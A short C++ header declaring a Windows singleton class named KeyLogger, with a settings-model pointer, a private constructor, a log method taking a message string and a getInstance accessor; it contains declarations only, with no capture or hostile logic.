#pragma once

#include <Windows.h>
#include <string>
#include <sstream>

#include "KeyLoggerSettingsModel.h"
#include "KeyLoggerState.h"
#include "KeyLoggedAreaHolder.h"
#include "CastingUtils.h"

class KeyLogger
{
private:
	static KeyLogger* instance;
private:
	KeyLoggerSettingsModel* logSettings = KeyLoggerSettingsModel::getInstance();
private:
	KeyLogger() {}
public:
	void log(std::string message);
public:
	static KeyLogger* getInstance();
};